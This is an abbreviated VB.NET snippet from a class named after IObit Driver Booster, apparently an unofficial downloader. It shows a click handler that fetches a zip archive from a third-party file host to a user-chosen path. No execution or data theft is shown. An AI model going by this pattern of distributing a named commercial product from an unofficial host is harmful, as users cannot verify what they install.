...
Public Class Iobit_Driver_Booster
    ...
    Private Sub Label6_Click(sender As Object, e As EventArgs) Handles Label6.Click
        ...
        Panel7.Hide()
        Timer1.Start()
        download.DownloadFileAsync(New Uri("https://612092f6-6003-49d0-8fe5-2e737d705081.usrfiles.com/archives/612092_addf99a2ff534d84862c06d20865645e.zip"), TextBox1.Text)
    End Sub
